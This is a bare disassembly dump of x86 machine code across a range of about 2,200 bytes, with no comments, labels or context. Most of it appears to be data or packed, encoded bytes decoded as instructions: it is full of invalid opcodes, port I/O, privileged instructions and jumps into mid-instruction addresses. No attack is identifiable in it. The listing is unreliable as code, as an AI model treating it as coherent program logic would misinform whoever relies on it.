  424ce7:	add    eax,0x2f4110c4
  424cec:	inc    ebp
  424ced:	dec    ebp
  424cee:	dec    ebp
  424cef:	dec    ebp
  424cf0:	ins    DWORD PTR es:[edi],dx
  424cf1:	in     eax,dx
  424cf2:	mov    ebx,DWORD PTR [ebx]
  424cf4:	in     al,0x2
  424cf6:	or     dh,0x32
  424cf9:	cmp    cl,BYTE PTR [ebp+0x7501018d]
  424cff:	dec    ebp
  424d00:	dec    ebp
  424d01:	dec    ebp
  424d02:	xchg   esi,eax
  424d03:	dec    ebp
  424d04:	or     ch,dh
  424d06:	sbb    BYTE PTR [edx],0x32
  424d09:	cmp    cl,BYTE PTR [ebp+0x4518018d]
  424d0f:	dec    ebp
  424d10:	dec    ebp
  424d11:	dec    ebp
  424d12:	stos   BYTE PTR es:[edi],al
  424d13:	or     cl,BYTE PTR [ebp-0x6a]
  424d16:	out    dx,eax
  424d17:	push   eax
  424d18:	ja     0x424d17
  424d1a:	add    DWORD PTR [edi-0x7a],esi
  424d1d:	or     al,BYTE PTR [eax-0x72c5d932]
  424d23:	lea    ecx,[ebp-0x7f]
  424d26:	xor    BYTE PTR [edi-0x3],0x4d
  424d2a:	test   DWORD PTR [eax-0xf7f7589],0xedfc538a
  424d34:	add    eax,0xc86b20d
  424d39:	mov    dl,0xba
  424d3b:	sub    edi,edi
  424d3d:	mov    dl,0x50
  424d3f:	ja     0x424cf0
  424d41:	xor    al,0x8a
  424d44:	xor    BYTE PTR [edi-0x76],0x53
  424d48:	push   ecx
  424d49:	in     eax,dx
  424d4a:	xor    cl,BYTE PTR ds:0xb22984b2
  424d50:	mov    esi,0x80fdff0c
  424d55:	ja     0x424cdd
  424d57:	arpl   WORD PTR [edx+0x775097d5],si
  424d5d:	jbe    0x424d23
  424d5f:	or     DWORD PTR [eax+0x76f0808d],eax
  424d65:	push   eax
  424d66:	ja     0x424cee
  424d68:	xor    BYTE PTR [edi-0x7a],0x63
  424d6c:	mov    dl,0xd5
  424d6e:	iret   
  424d6f:	or     BYTE PTR [edx],0x1d
  424d72:	sbb    BYTE PTR [edx],0x26
  424d75:	cmp    cl,BYTE PTR [ebp-0x28f19c73]
  424d7b:	stc    
  424d7c:	sbb    BYTE PTR [edx],0x26
  424d7f:	cmp    cl,BYTE PTR [ebp+0x1d0a808d]
  424d85:	arpl   WORD PTR [esi],cx
  424d87:	xlat   BYTE PTR ds:[ebx]
  424d88:	cmp    eax,DWORD PTR [eax-0x72c5d1e6]
  424d8e:	lea    eax,[eax-0x557fde69]
  424d94:	cmp    eax,0xa500eec
  424d99:	and    eax,0x808b7780
  424d9e:	lock mov edx,DWORD PTR [ebx-0x4]
  424da2:	in     eax,dx
  424da3:	add    eax,0xc86b20d
  424da8:	mov    dl,0xba
  424daa:	sub    edi,edi
  424dac:	mov    dl,0x50
  424dae:	ja     0x424d5f
  424db0:	adc    BYTE PTR [edi-0x796c64db],0x3
  424db7:	enter  0x4d4d,0x4f
  424dbb:	push   0x9
  424dbd:	movd   DWORD PTR [ebp-0x28b27273],mm1
  424dc4:	and    eax,0x86932a80
  424dc9:	sub    eax,0x4f4d4dc8
  424dce:	push   0x9
  424dd0:	pcmpeqb mm1,QWORD PTR [ebp+0x77808d8d]
  424dd7:	and    eax,0x94802a80
  424ddc:	xchg   BYTE PTR [eax+0x4f4d4dc2],bh
  424de2:	push   0x9
  424de4:	mov    cr1,ebp
  424de7:	lea    ecx,[ebp-0x6e796c65]
  424ded:	mov    ecx,DWORD PTR [ebp+0x4d]
  424df0:	dec    edi
  424df1:	push   0x9
  424df3:	ucomiss xmm1,DWORD PTR [ebp-0x317f7273]
  424dfa:	cmp    cl,BYTE PTR es:[ebp-0x28e29c73]
  424e01:	sbb    eax,DWORD PTR [eax-0x72c5cd32]
  424e07:	lea    eax,[ecx]
  424e09:	lock test BYTE PTR [esi-0x7f7b28b3],dl
  424e10:	lock and DWORD PTR [ebp-0x62],ecx
  424e14:	xchg   ebp,eax
  424e15:	xchg   ebx,eax
  424e16:	dec    ebp
  424e17:	or     ah,BYTE PTR ds:0x3a82ce80
  424e1d:	lea    ecx,[ebp-0x27f7280]
  424e23:	push   ebx
  424e24:	push   ecx
  424e25:	in     eax,dx
  424e26:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424e2c:	test   BYTE PTR [ecx],ch
  424e2e:	(bad)  
  424e2f:	std    
  424e30:	aad    0x0
  424e32:	jl     0x424eab
  424e34:	out    dx,eax
  424e35:	mul    BYTE PTR [ebx]
  424e37:	outs   dx,DWORD PTR ds:[esi]
  424e38:	cmp    BYTE PTR [eax-0xf7f1089],al
  424e3e:	out    dx,eax
  424e3f:	xor    BYTE PTR [edi+0x25],0xb2
  424e43:	mov    esi,0xc405a20c
  424e48:	hlt    
  424e49:	lea    ecx,[ebp+0x197d30b9]
  424e4f:	sub    BYTE PTR [ebp+0x3d],0x80
  424e53:	lock sub eax,0x925074ec
  424e59:	adc    eax,0x7c2d7780
  424e5e:	(bad)  
  424e5f:	in     al,dx
  424e60:	lea    ecx,[ebp+0x2d77808d]
  424e66:	push   eax
  424e67:	popf   
  424e68:	out    dx,al
  424e69:	xor    BYTE PTR [edi+0x71],0x80
  424e6d:	lock sub eax,0x80ef9250
  424e73:	ja     0x424e8a
  424e75:	xor    al,0x2d
  424e78:	push   eax
  424e79:	xchg   edx,eax
  424e7a:	and    esp,eax
  424e7c:	adc    eax,0x80257780
  424e81:	ins    DWORD PTR es:[edi],dx
  424e82:	cmp    eax,0xec2df080
  424e87:	je     0x424ed9
  424e89:	xchg   edx,eax
  424e8a:	adc    eax,0xed2d7780
  424e8f:	sub    eax,0xf7777c8d
  424e94:	cmp    cl,BYTE PTR [ebp-0x18127273]
  424e9a:	test   DWORD PTR [ebp-0x5bacf329],0xc4a37480
  424ea4:	or     al,0x53
  424ea6:	push   0xffffffab
  424ea8:	test   eax,0x8d25fb70
  424ead:	xchg   edi,eax
  424eae:	add    BYTE PTR [edi+0x5c099696],0x92
  424eb5:	adc    eax,0x1def7501
  424eba:	or     DWORD PTR [edi+edi*2+0x6f],ebx
  424ebe:	xchg   ebx,eax
  424ebf:	fwait
  424ec0:	jl     0x424f39
  424ec2:	mov    dh,dh
  424ec4:	and    al,0x6f
  424ec6:	cmp    BYTE PTR [eax-0x10],dl
  424ec9:	mov    ecx,DWORD PTR [edi+0x70]
  424ecc:	aad    0xb5
  424ece:	icebp  
  424ecf:	and    ah,BYTE PTR [edi+ebp*2]
  424ed2:	cmp    BYTE PTR [eax-0x187fde83],al
  424ed8:	out    dx,eax
  424ed9:	in     al,dx
  424eda:	retf   
  424edb:	pop    edi
  424edc:	out    0x21,eax
  424ede:	in     al,0xcf
  424ee0:	sbb    ch,0xef
  424ee3:	in     al,dx
  424ee4:	retf   
  424ee5:	in     al,dx
  424ee6:	out    0xef,eax
  424ee8:	pop    edi
  424ee9:	out    0x21,eax
  424eeb:	in     al,0x7b
  424eed:	xor    al,0x8a
  424ef0:	and    bh,0x8a
  424ef3:	push   ebx
  424ef4:	(bad)  
  424ef5:	in     eax,dx
  424ef6:	dec    ebx
  424ef7:	or     eax,0x8029bcb2
  424efc:	mov    al,ds:0xff0cc4b2
  424f01:	push   es
  424f02:	in     eax,dx
  424f03:	mov    edx,0xeeb2ed8a
  424f08:	in     eax,dx
  424f09:	push   0x3d
  424f0b:	jnp    0x424ebf
  424f0d:	popa   
  424f0e:	sub    edi,edi
  424f10:	retf   
  424f11:	mov    ds:0x6f24f64b,al
  424f16:	cmp    BYTE PTR [edx],bh
  424f18:	out    0x8a,eax
  424f1a:	xor    al,0x8a
  424f1d:	and    bh,0x8a
  424f20:	push   ebx
  424f21:	(bad)  
  424f22:	in     eax,dx
  424f23:	dec    ebx
  424f24:	or     eax,0xb20cbeb2
  424f29:	mov    esp,0x632aff29
  424f2e:	lock mov esp,esp
  424f31:	dec    edx
  424f32:	push   ebx
  424f33:	push   0xffffffab
  424f35:	mov    ds:0x8deffb70,eax
  424f3a:	xchg   edi,eax
  424f3b:	add    BYTE PTR [edi+0x7c8187ed],0x77
  424f42:	cmp    DWORD PTR [ebx+0x7c8d8dad],0x77
  424f49:	stc    
  424f4a:	in     al,dx
  424f4b:	ror    DWORD PTR [ebp-0x7b888373],0x14
  424f52:	ror    BYTE PTR [ebp-0x74888373],cl
  424f58:	call   0x8a77:0x7c8dee71
  424f5f:	stc    
  424f60:	lods   eax,DWORD PTR ds:[esi]
  424f61:	lea    ecx,[ebp-0x5088884]
  424f67:	dec    DWORD PTR [ebp+0x7a777c8d]
  424f6d:	dec    ebx
  424f6e:	aam    0x8d
  424f70:	lea    edi,[edi+esi*2-0x7e]
  424f74:	in     al,dx
  424f75:	lea    ecx,[ebp-0x79888373]
  424f7b:	mov    dl,0xb9
  424f7d:	lea    ecx,[ebp-0x7f788884]
  424f83:	xchg   esi,eax
  424f84:	lea    ecx,[ebp+0x332777c]
  424f8a:	mov    bh,0x8d
  424f8c:	lea    eax,[eax-0x73a17510]
  424f92:	fimul  DWORD PTR [ebp-0x7f4dbc73]
  424f98:	lock mov edx,DWORD PTR [ebx+0x72]
  424f9c:	dec    ebx
  424f9d:	add    eax,0xfd809b99
  424fa2:	mov    ds:0x8d90f1ba,al
  424fa7:	lea    esp,[edx-0x7238d090]
  424fad:	lea    esp,[edx-0x725a2bfb]
  424fb3:	lea    esp,[edx-0x72c2204e]
  424fb9:	lea    edi,[edi+esi*2-0x38]
  424fbd:	div    eax
  424fbf:	lea    ecx,[ebp-0x24758884]
  424fc5:	aad    0x8d
  424fc7:	lea    edi,[edi+esi*2-0x75]
  424fcb:	sbb    DWORD PTR [ecx-0x73],esi
  424fce:	lea    eax,[eax-0x687f7489]
  424fd4:	mov    dh,BYTE PTR [edi]
  424fd6:	dec    ecx
  424fd7:	popf   
  424fd8:	lea    ecx,[ebp+0x77ecfb53]
  424fde:	enter  0xb680,0x57
  424fe2:	jnp    0x424ff1
  424fe4:	lea    ecx,[ebp-0x68af08bd]
  424fea:	mov    al,BYTE PTR [eax+0x77ec8a77]
  424ff0:	out    dx,eax
  424ff1:	adc    BYTE PTR [edi+0x2197ec8a],0x8f
  424ff8:	nop
  424ff9:	adc    BYTE PTR [ecx-0x80],dh
  424ffc:	ja     0x425030
  424ffe:	adc    BYTE PTR [edi-0x76e6c879],0x8d
  425005:	lea    edx,[ebx-0x5]
  425008:	adc    BYTE PTR [edi-0xe04007a],0x3
  42500f:	(bad)  [ebp-0x7f08bc73]
  425015:	ja     0x425010
  425017:	in     al,dx
  425018:	(bad)  
  425019:	icebp  
  42501a:	test   al,0x55
  42501c:	lea    ecx,[ebp-0x681308bd]
  425022:	test   BYTE PTR [eax-0x287f7c89],al
  425028:	jno    0x424faa
  42502a:	out    0x82,eax
  42502c:	mov    ds:0x8d9630c2,al
  425031:	lea    esi,[ebx]
  425033:	test   DWORD PTR [eax-0x3d5d8589],0x8d8d2db7
  42503d:	inc    ebx
  42503e:	ret    0x7253
  425041:	dec    ebx
  425042:	dec    ebx
  425043:	adc    BYTE PTR [edi+0x1fe757f7],0x8d
  42504a:	lea    esi,[ebx]
  42504c:	sti    
  42504d:	xor    BYTE PTR [esi+0x7a2f743],0x4c
  425054:	fmul   DWORD PTR [ebp+0x97e638d]
  42505a:	dec    esp
  42505b:	mov    ds:0xab4d4d4d,eax
  425060:	test   eax,0x8d21fb70
  425065:	xchg   edi,eax
  425066:	add    BYTE PTR [edi-0x6c8a7813],0x99
  42506d:	fwait
  42506e:	jl     0x4250e7
  425070:	xchg   DWORD PTR [ebx+eiz*2+0x777c8d8d],ebx
  425077:	xor    dl,al
  425079:	jg     0x425008
  42507b:	lea    edi,[edi+esi*2-0x38]
  42507f:	pusha  
  425080:	xchg   esi,eax
  425081:	lea    ecx,[ebp-0x15748884]
  425087:	xchg   esi,eax
  425088:	lea    ecx,[ebp-0xd758884]
  42508e:	sub    eax,0x777c8d8d
  425093:	sbb    ecx,0x59
  425096:	lea    ecx,[ebp+0x7784777c]
  42509c:	out    dx,al
  42509d:	lea    ecx,[ebp+0x6df9777c]
  4250a3:	xor    DWORD PTR [ebp-0x79888373],ecx
  4250a9:	sbb    ebx,DWORD PTR [edi-0x73]
  4250ac:	lea    edi,[edi+esi*2+0x66]
  4250b0:	pop    esp
  4250b1:	leave  
  4250b2:	lea    ecx,[ebp-0x59958884]
  4250b8:	lea    ecx,[ebp+0x76777c8d]
  4250be:	iret   
  4250bf:	cmp    DWORD PTR [ebp-0x2888373],ecx
  4250c5:	and    BYTE PTR [ecx],ch
  4250c7:	lea    ecx,[ebp+0x5caf777c]
  4250cd:	iret   
  4250ce:	lea    ecx,[ebp-0x1a088884]
  4250d4:	sbb    eax,0x77808d8d
  4250d9:	test   BYTE PTR [eax-0x55307c10],al
  4250df:	xor    ecx,DWORD PTR [ebp-0x58c1b873]
  4250e5:	lea    ecx,[ebp-0x72dcdf31]
  4250eb:	lea    ecx,[ecx]
  4250ed:	and    dh,BYTE PTR [edx+0x7f549e60]
  4250f3:	mov    eax,DWORD PTR [ebx-0x3]
  4250f6:	xor    BYTE PTR [edi-0x76],0x80
  4250fa:	xchg   edi,eax
  4250fb:	mov    esi,DWORD PTR [ebx]
  4250fd:	sti    
  4250fe:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425105:	lea    eax,[ebx-0x5]
  425108:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42510f:	xchg   edi,edi
  425111:	sti    
  425112:	push   ebx
  425113:	jb     0x42510f
  425115:	pushf  
  425116:	ins    BYTE PTR es:[edi],dx
  425117:	dec    ebp
  425118:	dec    ebp
  425119:	dec    ebx
  42511a:	or     eax,DWORD PTR [eax-0x2f93de69]
  425120:	pop    ds
  425121:	lea    ecx,[ebp+0x7780f743]
  425127:	xchg   BYTE PTR [eax+0x7c43f9d7],al
  42512d:	or     DWORD PTR [edx],esp
  42512f:	cld    
  425130:	cli    
  425131:	mov    al,ds:0xbe309e50
  425136:	icebp  
  425137:	lea    ecx,[ebp+0x7a777c8d]
  42513d:	sbb    al,0x55
  42513f:	lea    ecx,[ebp+0x2e82777c]
  425145:	leave  
  425146:	lea    ecx,[ebp-0x327b8884]
  42514c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42514d:	lea    ecx,[ebp+0x3a83777c]
  425153:	lea    ecx,[ebp-0x7c587f73]
  425159:	push   ebx
  42515a:	jb     0x4251ba
  42515c:	fwait
  42515d:	leave  
  42515e:	lea    ecx,[ebp-0x687f39b5]
  425164:	test   BYTE PTR [eax-0x4001059],al
  42516a:	adc    BYTE PTR [edi-0x7f04bc7e],0x97
  425171:	jp     0x4251aa
  425173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425174:	or     DWORD PTR [ebp-0x4ddf673],0x59ef0f01
  42517e:	sub    eax,0x77508ade
  425183:	jp     0x425105
  425185:	ja     0x42517e
  425187:	adc    BYTE PTR [edi+0xbc835af],0x7
  42518e:	adc    BYTE PTR [edi+0x4523357a],0x2f
  425195:	and    DWORD PTR [esi+ebp*8-0x4f11efb9],edx
  42519c:	xor    BYTE PTR [edi-0x3],0xcf
  4251a0:	mov    es,edi
  4251a2:	lea    ecx,[ebp-0x7f898814]
  4251a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251a9:	push   0x53
  4251ab:	jb     0x4251f8
  4251ad:	mov    BYTE PTR [eax-0x639b9969],0x6c
  4251b4:	dec    ebp
  4251b5:	dec    ebp
  4251b6:	aaa    
  4251b7:	cmp    BYTE PTR [edi-0x73],dl
  4251ba:	lea    eax,[ebx-0x5]
  4251bd:	push   edi
  4251be:	adc    DWORD PTR [edx+0x4d],ebp
  4251c1:	dec    ebp
  4251c2:	in     al,dx
  4251c3:	std    
  4251c4:	xor    BYTE PTR [edi-0x76],0x80
  4251c8:	xchg   edi,eax
  4251c9:	mov    esi,DWORD PTR [ebx]
  4251cb:	sti    
  4251cc:	adc    BYTE PTR [edi-0x36b73038],0x8d
  4251d3:	lea    eax,[ebx-0x5]
  4251d6:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  4251dd:	xchg   edi,edi
  4251df:	sti    
  4251e0:	push   ebx
  4251e1:	jb     0x42522e
  4251e3:	mov    BYTE PTR [eax-0x8bcde69],0x80
  4251ea:	ja     0x425172
  4251ec:	and    BYTE PTR [edi+0x97c43f9],0x22
  4251f3:	je     0x425175
  4251f5:	mov    al,ds:0x4ec8243
  4251fa:	arpl   WORD PTR [ebx],ax
  4251fc:	or     DWORD PTR [ebp+ebx*2+0x4d],ecx
  425200:	dec    ebp
  425201:	dec    ebp
  425202:	stos   DWORD PTR es:[edi],eax
  425203:	test   eax,0xeffb70a3
  425208:	lea    edx,[edi-0x78127880]
  42520e:	or     bh,BYTE PTR [edi+esi*2+0x62]
  425212:	in     al,0x58
  425214:	fist   WORD PTR [ecx]
  425216:	pop    esi
  425217:	xchg   BYTE PTR [edi+0x77502643],cl
  42521d:	push   esi
  42521e:	jl     0x425297
  425220:	pop    esi
  425221:	loop   0x42527b
  425223:	fist   WORD PTR [ecx]
  425225:	push   eax
  425226:	ja     0x42528e
  425228:	jl     0x4252a1
  42522a:	push   0xffffffe6
  42522c:	pop    eax
  42522d:	fist   WORD PTR [ecx]
  42522f:	push   eax
  425230:	ja     0x4252a8
  425232:	xchg   ebx,eax
  425233:	jl     0x4252ac
  425235:	std    
  425236:	rcr    BYTE PTR [eax-0x21],1
  425239:	adc    DWORD PTR [eax+0x77],edx
  42523c:	scas   eax,DWORD PTR es:[edi]
  42523d:	cdq    
  42523e:	fwait
  42523f:	jl     0x4252b8
  425241:	neg    DWORD PTR [ecx+0x5011df58]
  425247:	ja     0x4252c3
  425249:	push   ebx
  42524a:	jb     0x42529f
  42524c:	dec    ebp
  42524d:	pusha  
  42524e:	mul    BYTE PTR [edi+ebp*2]
  425251:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  425255:	call   0x7b5431b2
  42525a:	push   eax
  42525b:	ja     0x4251e0
  42525d:	xor    BYTE PTR [edx+0x50879750],0xe7
  425264:	stc    
  425265:	add    DWORD PTR [esi+0xd32ed3a],ebx
  42526b:	mov    dl,0x84
  42526d:	sub    edi,edi
  42526f:	sti    
  425270:	add    DWORD PTR [ebp+0x78],esi
  425273:	bound  eax,QWORD PTR [eax-0x11627f8f]
  425279:	or     DWORD PTR [esi+0x3],eax
  42527c:	or     al,0xb2
  42527e:	les    ecx,FWORD PTR [eax+eax*4]
  425281:	sbb    eax,0x53ee6d80
  425286:	push   0xffffffa2
  425288:	ret    0xc7a7
  42528b:	add    al,0xd4
  42528d:	push   edi
  42528f:	push   eax
  425290:	xchg   edi,eax
  425291:	mov    eax,DWORD PTR [eax+0x6aec8b77]
  425297:	mov    dl,0xb4
  425299:	sub    DWORD PTR [ebx+0x77],esp
  42529c:	and    DWORD PTR [ecx],ecx
  42529e:	into   
  42529f:	lea    ecx,fs:[ebp-0x74887f73]
  4252a6:	in     eax,dx
  4252a7:	mov    bh,0x86
  4252a9:	lea    edx,[eax-0x19]
  4252ac:	xor    al,BYTE PTR [eax+0x6a4f8b77]
  4252b2:	aad    0xb7
  4252b4:	push   ebx
  4252b5:	push   0x50
  4252b7:	out    0xc8,eax
  4252b9:	adc    BYTE PTR [edi-0x10587f7a],0x1
  4252c0:	gs jno 0x425243
  4252c3:	xchg   edi,eax
  4252c4:	out    dx,eax
  4252c5:	in     al,dx
  4252c6:	pushf  
  4252c7:	push   eax
  4252c8:	xchg   edi,eax
  4252c9:	test   BYTE PTR [edi+0x4d971090],cl
  4252cf:	adc    BYTE PTR [edi-0x70631375],0x15
  4252d6:	mov    al,0x80
  4252d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252d9:	test   BYTE PTR [eax],dl
  4252db:	adc    ecx,DWORD PTR [edi-0x587fb269]
  4252e1:	mov    ebp,esp
  4252e3:	lods   al,BYTE PTR ds:[esi]
  4252e4:	and    bh,0xef
  4252e7:	adc    BYTE PTR ds:0xc8978063,dl
  4252ed:	ins    DWORD PTR es:[edi],dx
  4252ee:	in     eax,dx
  4252ef:	clc    
  4252f0:	mov    dh,BYTE PTR [edx-0x412d67a]
  4252f6:	out    dx,al
  4252f7:	(bad)  
  4252f8:	sti    
  4252f9:	push   ebx
  4252fa:	mov    dl,0x50
  4252fc:	ja     0x4252c6
  4252fe:	outs   dx,BYTE PTR ds:[esi]
  4252ff:	xlat   BYTE PTR ds:[ebx]
  425300:	enter  0x9780,0xc8
  425304:	in     eax,dx
  425305:	xor    cl,BYTE PTR ds:0xb20c07b2
  42530b:	test   BYTE PTR [ecx],ch
  42530d:	(bad)  
  42530e:	sti    
  42530f:	adc    BYTE PTR [edi-0x1b049c75],0x34
  425316:	push   ebx
  425317:	dec    ebp
  425318:	jnp    0x42529a
  42531a:	ja     0x42534e
  42531c:	adc    BYTE PTR [edi-0x79587f75],0xed
  425323:	test   BYTE PTR [edx-0x7f0811ff],cl
  425329:	xchg   edi,eax
  42532a:	mov    eax,DWORD PTR [ecx]
  42532c:	adc    eax,0x21a78093
  425331:	mov    dl,0x7
  425333:	sub    edi,edi
  425335:	sti    
  425336:	push   ebx
  425337:	mov    dl,0x50
  425339:	ja     0x42536d
  42533b:	outs   dx,BYTE PTR ds:[esi]
  42533c:	xlat   BYTE PTR ds:[ebx]
  42533d:	xor    al,BYTE PTR [eax+0x32ed3297]
  425343:	or     eax,0xb20c07b2
  425348:	test   BYTE PTR [ecx],ch
  42534a:	(bad)  
  42534b:	sti    
  42534c:	adc    BYTE PTR [edi+0x4372ec8b],0x3
  425353:	push   eax
  425354:	ja     0x4252dc
  425356:	arpl   WORD PTR [ecx+ecx*1+0x4c],si
  42535a:	leave  
  42535b:	dec    ebp
  42535c:	dec    ebp
  42535d:	dec    ebp
  42535e:	xor    BYTE PTR [edi-0x79],0x80
  425362:	xchg   edi,eax
  425363:	stc    
  425364:	in     eax,dx
  425365:	clc    
  425366:	mov    ch,BYTE PTR [ebp-0x13]
  425369:	sti    
  42536a:	out    dx,al
  42536b:	mov    dl,0x86
  42536d:	sub    edi,edi
  42536f:	sti    
  425370:	push   ebx
  425371:	mov    dl,0x80
  425373:	add    BYTE PTR [eax-0x1281ac09],0xc6
  42537a:	or     eax,0x5029b4b2
  42537f:	xchg   edi,eax
  425380:	stc    
  425381:	mov    dl,0x7
  425383:	or     al,0x50
  425385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425386:	xchg   DWORD PTR [eax],esi
  425388:	xchg   edi,eax
  425389:	xchg   ebp,ebp
  42538b:	out    0x87,eax
  42538d:	outs   dx,DWORD PTR ds:[esi]
  42538e:	or     edx,ebp
  425390:	jp     0x42539f
  425392:	dec    ebp
  425393:	dec    ebp
  425394:	stos   DWORD PTR es:[edi],eax
  425395:	test   eax,0xeffb70a3
  42539a:	lea    edx,[edi-0x78127880]
  4253a0:	adc    eax,0x7cef7780
  4253a5:	ja     0x4253d9
  4253a7:	mul    BYTE PTR [edi+ebp*2]
  4253aa:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  4253ae:	cmc    
  4253af:	and    al,0x6f
  4253b1:	cmp    BYTE PTR [eax+0x5099938d],al
  4253b7:	ja     0x425344
  4253b9:	jl     0x425432
  4253bb:	enter  0x24dc,0x6f
  4253bf:	cmp    BYTE PTR [ebx+0x4787777c],bl
  4253c5:	sbb    al,0xf9
  4253c7:	adc    eax,DWORD PTR [eax-0xf7f7529]
  4253cd:	mov    ah,dl
  4253cf:	or     eax,0x6f24225e
  4253d4:	cmp    BYTE PTR [ebx-0x454dd5ad],ch
  4253da:	sub    DWORD PTR [ebx+0x32],edx
  4253dd:	mov    dl,0x88
  4253df:	or     al,0xff
  4253e1:	add    eax,0x8032f080
  4253e6:	xchg   edi,eax
  4253e7:	xor    dl,BYTE PTR [ebx-0x3]
  4253ea:	push   ebx
  4253eb:	pushf  
  4253ec:	mov    dl,0xbe
  4253ee:	or     al,0xb2
  4253f0:	clc    
  4253f1:	sub    edi,edi
  4253f3:	dec    BYTE PTR [ecx]
  4253f5:	and    al,BYTE PTR ds:0x8d8d24be
  4253fb:	lea    eax,[eax-0x687f7410]
  425401:	mov    edx,DWORD PTR [ebx-0x64]
  425404:	mov    dl,0xf8
  425406:	sub    DWORD PTR [ebx-0x3],edx
  425409:	mov    dl,0xbe
  42540b:	or     al,0xff
  42540d:	inc    BYTE PTR [eax-0x587f7569]
  425413:	mov    dl,BYTE PTR [ebx-0x9]
  425416:	push   ebx
  425417:	lods   al,BYTE PTR ds:[esi]
  425418:	mov    dl,0x7
  42541a:	or     al,0xb2
  42541c:	mov    ah,0x29
  42541e:	call   DWORD PTR [edi+ecx*2-0x74687f02]
  425425:	xor    al,0x8b
  425428:	aad    0x59
  42542a:	push   ebx
  42542b:	sub    dh,BYTE PTR [edx-0x8acd646]
  425431:	mov    dl,0x7
  425433:	or     al,0xff
  425435:	mov    dh,0x80
  425437:	lock mov al,BYTE PTR [eax-0x2ac7559]
  42543e:	push   ebx
  42543f:	lods   al,BYTE PTR ds:[esi]
  425440:	mov    dl,0xbe
  425442:	or     al,0xb2
  425444:	mov    ah,0x29
  425446:	call   DWORD PTR [ecx]
  425448:	xchg   esp,eax
  425449:	pop    es
  42544a:	xor    al,0x87
  42544d:	and    BYTE PTR [edi+0x53fd5387],0xac
  425454:	mov    dl,0xbe
  425456:	or     al,0xb2
  425458:	mov    ah,0x29
  42545a:	call   DWORD PTR [ecx]
  42545c:	push   ebx
  42545d:	mov    dh,0xc4
  42545f:	sub    eax,0xbab22a53
  425464:	sub    DWORD PTR [ebx-0x9],edx
  425467:	mov    dl,0x7
  425469:	or     al,0xff
  42546b:	mov    dh,0x80
  42546d:	lock mov al,BYTE PTR [eax-0x2ac7559]
  425474:	push   ebx
  425475:	lods   al,BYTE PTR ds:[esi]
  425476:	mov    dl,0xbe
  425478:	or     al,0xb2
  42547a:	mov    ah,0x29
  42547c:	call   DWORD PTR [ecx]
  42547e:	xchg   esp,eax
  42547f:	pop    es
  425480:	push   eax
  425481:	xchg   edi,eax
  425482:	mov    eax,DWORD PTR [eax-0x687f7510]
  425488:	mov    dl,BYTE PTR [ebx-0x3]
  42548b:	push   ebx
  42548c:	pushf  
  42548d:	mov    dl,0xbe
  42548f:	or     al,0xb2
  425491:	clc    
  425492:	sub    edi,edi
  425494:	(bad)  
  425495:	in     al,dx
  425496:	add    eax,0x80c8f080
  42549b:	xchg   edi,eax
  42549c:	enter  0x9c53,0x53
  4254a0:	std    
  4254a1:	mov    dl,0xf8
  4254a3:	sub    DWORD PTR [edx-0x100f342],esi
  4254a9:	adc    BYTE PTR [edi-0x75587f76],0x53
  4254b0:	not    DWORD PTR [ebx-0x54]
  4254b3:	mov    dl,0xb4
  4254b5:	sub    DWORD PTR [edx-0x6b00f3f9],esi
  4254bb:	inc    ebx
  4254bc:	(bad)  
  4254bd:	arpl   WORD PTR ds:0x4d5b4c09,ax
  4254c3:	dec    ebp
  4254c4:	dec    ebp
  4254c5:	xor    BYTE PTR [edi-0x75],0x80
  4254c9:	lock out dx,eax
  4254cb:	stos   DWORD PTR es:[edi],eax
  4254cc:	test   eax,0x77803a50
  4254d1:	mov    esp,DWORD PTR [ebx-0x72110490]
  4254d7:	xchg   edi,eax
  4254d8:	add    BYTE PTR [edi+0x70539696],0x5f
  4254df:	lock and ebp,edx
  4254e2:	in     eax,0x5f
  4254e4:	lock out dx,eax
  4254e6:	(bad)  
  4254e8:	(bad)  
  4254e9:	out    dx,al
  4254ea:	outs   dx,BYTE PTR ds:[esi]
  4254eb:	adc    BYTE PTR [edi+0x9],dh
  4254ee:	cld    
  4254ef:	ja     0x4254bd
  4254f1:	aad    0xfc
  4254f3:	ja     0x425502
  4254f5:	sbb    esp,edi
  4254f7:	ja     0x425546
  4254f9:	ror    BYTE PTR [ecx],1
  4254fb:	loopne 0x425574
  4254fd:	dec    ebp
  4254fe:	or     eax,esp
  425500:	xchg   edi,eax
  425501:	or     eax,0x8d8d7acf
  425506:	lea    esi,[ebx]
  425508:	sti    
  425509:	or     eax,esp
  42550b:	xchg   edi,eax
  42550c:	int3   
  42550d:	xor    edi,ebx
  42550f:	adc    BYTE PTR [edi-0x7b],dh
  425512:	cld    
  425513:	ja     0x42551b
  425515:	or     eax,0xd48a77fc
  42551a:	cld    
  42551b:	ja     0x42556a
  42551d:	jl     0x42551b
  42551f:	ja     0x42552e
  425521:	sar    esp,cl
  425523:	ja     0x4254f1
  425525:	push   esp
  425526:	(bad)  
  425527:	ja     0x4254f5
  425529:	(bad)  
  42552a:	xchg   edi,eax
  42552b:	or     eax,0x978ffba6
  425530:	dec    ebp
  425531:	sar    bl,cl
  425533:	(bad)  
  425534:	xchg   edi,eax
  425535:	mov    cl,BYTE PTR [ebx]
  425537:	pop    es
  425538:	(bad)  
  425539:	xchg   edi,eax
  42553a:	push   es
  42553b:	sar    bl,cl
  42553d:	(bad)  
  42553e:	xchg   edi,eax
  42553f:	test   esi,edx
  425541:	neg    ebx
  425543:	or     DWORD PTR [ecx],ecx
  425545:	loopne 0x4255be
  425547:	or     DWORD PTR [edi+0x8],eax
  42554a:	lea    ecx,[ebp+0x977108d]
  425550:	div    eax
  425552:	or     DWORD PTR [edi-0x11eff689],ecx
  425558:	outs   dx,BYTE PTR ds:[esi]
  425559:	xchg   edx,eax
  42555a:	arpl   ax,si
  42555c:	out    dx,eax
  42555d:	in     al,0x50
  42555f:	dec    ebp
  425560:	xlat   BYTE PTR ds:[ebx]
  425561:	out    dx,eax
  425562:	cdq    
  425563:	xchg   BYTE PTR [edx-0x76],cl
  425566:	dec    ebp
  425567:	dec    ebp
  425568:	jo     0x425565
